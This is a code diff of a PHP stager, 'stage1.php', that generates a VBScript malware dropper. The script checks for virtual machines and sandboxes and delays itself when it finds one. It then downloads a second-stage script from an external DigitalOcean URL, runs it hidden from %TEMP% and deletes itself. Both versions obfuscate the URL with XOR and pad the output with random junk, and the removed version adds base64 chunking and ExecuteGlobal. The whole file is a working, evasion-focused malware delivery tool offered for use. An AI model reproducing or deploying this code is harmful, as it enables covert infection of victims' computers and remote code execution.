@@ -1,5 +1,5 @@
 <?php
-// stage1.php - Fully protected Stager (XOR URL + Encoding + Random name + Varying size)
+// stage1.php - Clean + Lightly Obfuscated Stager
 header('Content-Type: text/plain; charset=utf-8');
 header('Cache-Control: no-store, no-cache, must-revalidate');
 
@@ -29,80 +29,62 @@ setcookie($cookieName, json_encode(array_unique($used)), time() + (30 * 24 * 60 
 
 header('Content-Disposition: attachment; filename="' . $chosen . '"');
 
-// ===== CHANGE THIS to your real Stage 2 URL =====
+// ===== CHANGE THIS =====
 $stage2Url = "https://walrus-app-f8pss.ondigitalocean.app/stage2.php";
 
-// ===== Generate XOR arrays =====
-$key = [];
-$cipher = [];
-$urlLen = strlen($stage2Url);
-
-for ($i = 0; $i < $urlLen; $i++) {
-    $k = rand(1, 255);
-    $key[] = $k;
-    $cipher[] = ord($stage2Url[$i]) ^ $k;
+// Light XOR for the URL
+$xorKey = rand(40, 90);
+$encrypted = "";
+for ($i = 0; $i < strlen($stage2Url); $i++) {
+    $encrypted .= "Chr(" . (ord($stage2Url[$i]) ^ $xorKey) . ")&";
 }
+$encrypted = rtrim($encrypted, "&");
 
-function formatArray($arr) {
-    $lines = [];
-    $chunks = array_chunk($arr, 10);
-    foreach ($chunks as $chunk) {
-        $hex = array_map(function($v) {
-            return "&H" . strtoupper(str_pad(dechex($v), 2, "0", STR_PAD_LEFT));
-        }, $chunk);
-        $lines[] = "  " . implode(",", $hex);
-    }
-    return implode(", _\r\n", $lines);
-}
-
-$keyFormatted    = formatArray($key);
-$cipherFormatted = formatArray($cipher);
-
-// ===== Random junk =====
-$junkLines = rand(6, 25);
+// Varying size junk
+$junkLines = rand(5, 18);
 $junk = "";
 for ($i = 0; $i < $junkLines; $i++) {
-    $junk .= "' Junk " . bin2hex(random_bytes(rand(5, 14))) . "\r\n";
+    $junk .= "' " . bin2hex(random_bytes(rand(4, 12))) . "\r\n";
 }
 
-$realVbs = <<<REAL
+echo <<<VBS
+' System Helper
 On Error Resume Next
 
-Dim svc, score, objShell, objFSO, http, stream, stage2, tempFile, mefinuwig, harogilim, i
+Dim score, objShell, objFSO, http, stream, stage2, tempFile, k
 score = 0
+k = $xorKey
 
-Set svc = GetObject("winmgmts:{impersonationLevel=impersonate}!\\\\.\\root\\cimv2")
-If Err.Number <> 0 Then WScript.Quit
-
-Function ContainsAny(value, needles)
-    Dim n
-    value = LCase(CStr(value))
-    For Each n In needles
-        If InStr(value, LCase(CStr(n))) > 0 Then
-            ContainsAny = True
+Function C(v, n)
+    Dim x
+    v = LCase(CStr(v))
+    For Each x In n
+        If InStr(v, LCase(CStr(x))) > 0 Then
+            C = True
             Exit Function
         End If
     Next
-    ContainsAny = False
+    C = False
 End Function
 
-Dim item, textValue, count
+Dim svc, item, t, c
+Set svc = GetObject("winmgmts:\\\\.\\root\\cimv2")
 
-For Each item In svc.ExecQuery("SELECT Manufacturer, Model FROM Win32_ComputerSystem")
-    textValue = CStr(item.Manufacturer) & " " & CStr(item.Model)
-    If ContainsAny(textValue, Array("vmware","virtualbox","virtual machine","kvm","qemu","xen","parallels","hyper-v")) Then score = score + 3
+For Each item In svc.ExecQuery("SELECT Manufacturer,Model FROM Win32_ComputerSystem")
+    t = item.Manufacturer & " " & item.Model
+    If C(t, Array("vmware","virtualbox","virtual machine","kvm","qemu","xen","parallels","hyper-v")) Then score = score + 3
 Next
 
-For Each item In svc.ExecQuery("SELECT Manufacturer, SMBIOSBIOSVersion FROM Win32_BIOS")
-    textValue = CStr(item.Manufacturer) & " " & CStr(item.SMBIOSBIOSVersion)
-    If ContainsAny(textValue, Array("vmware","virtualbox","vbox","qemu","xen","parallels","hyper-v")) Then score = score + 3
+For Each item In svc.ExecQuery("SELECT Manufacturer,SMBIOSBIOSVersion FROM Win32_BIOS")
+    t = item.Manufacturer & " " & item.SMBIOSBIOSVersion
+    If C(t, Array("vmware","virtualbox","vbox","qemu","xen","parallels","hyper-v")) Then score = score + 3
 Next
 
-count = 0
+c = 0
 For Each item In svc.ExecQuery("SELECT Name FROM Win32_Process")
-    count = count + 1
+    c = c + 1
 Next
-If count < 35 Then score = score + 1
+If c < 35 Then score = score + 1
 
 If score >= 3 Then
     WScript.Sleep 1800000
@@ -112,17 +94,8 @@ End If
 Set objShell = CreateObject("WScript.Shell")
 Set objFSO = CreateObject("Scripting.FileSystemObject")
 
-' ===== Reconstruct Stage 2 URL =====
-mefinuwig = Array( _
-$keyFormatted )
-harogilim = Array( _
-$cipherFormatted )
-stage2 = ""
-For i = 0 To UBound(harogilim)
-  stage2 = stage2 & Chr(harogilim(i) Xor mefinuwig(i))
-Next
-
-tempFile = objShell.ExpandEnvironmentStrings("%TEMP%") & "\\update_" & Int(Rnd * 99999) & ".vbs"
+stage2 = $encrypted
+tempFile = objShell.ExpandEnvironmentStrings("%TEMP%") & "\\u" & Int(Rnd*99999) & ".vbs"
 
 Set http = CreateObject("MSXML2.XMLHTTP")
 http.Open "GET", stage2, False
@@ -135,7 +108,6 @@ If http.Status = 200 Then
     stream.Write http.responseBody
     stream.SaveToFile tempFile, 2
     stream.Close
-
     objShell.Run "wscript.exe """ & tempFile & """", 0, False
 End If
 
@@ -143,39 +115,5 @@ objFSO.DeleteFile WScript.ScriptFullName, True
 
 $junk
 WScript.Quit
-REAL;
-
-// ===== Base64 Chunk Encoding =====
-$chunkSize = 90;
-$base64 = base64_encode($realVbs);
-$len = strlen($base64);
-$count = ceil($len / $chunkSize);
-
-$vbs = "Option Explicit\r\n";
-$vbs .= "Dim vuliri(" . ($count - 1) . ")\r\n";
-
-for ($i = 0; $i < $count; $i++) {
-    $start = $i * $chunkSize;
-    $chunk = substr($base64, $start, $chunkSize);
-    $vbs .= "vuliri($i) = \"$chunk\"\r\n";
-}
-
-$vbs .= "\r\nDim ojofofi : ojofofi = Join(vuliri, \"\")\r\n";
-$vbs .= "ExecuteGlobal ahokehuho(ojofofi)\r\n\r\n";
-$vbs .= "Function ahokehuho(s)\r\n";
-$vbs .= " Dim cihozot, alemi, nd\r\n";
-$vbs .= " Set cihozot = CreateObject(\"Msxml2.DOMDocument.6.0\")\r\n";
-$vbs .= " Set nd = cihozot.createElement(\"b\")\r\n";
-$vbs .= " nd.dataType = \"bin.base64\"\r\n";
-$vbs .= " nd.text = s\r\n";
-$vbs .= " Set alemi = CreateObject(\"ADODB.Stream\")\r\n";
-$vbs .= " alemi.Type = 1 : alemi.Open\r\n";
-$vbs .= " alemi.Write nd.nodeTypedValue\r\n";
-$vbs .= " alemi.Position = 0\r\n";
-$vbs .= " alemi.Type = 2 : alemi.Charset = \"UTF-8\"\r\n";
-$vbs .= " ahokehuho = alemi.ReadText\r\n";
-$vbs .= " alemi.Close\r\n";
-$vbs .= "End Function\r\n";
-
-echo $vbs;
+VBS;
 ?>
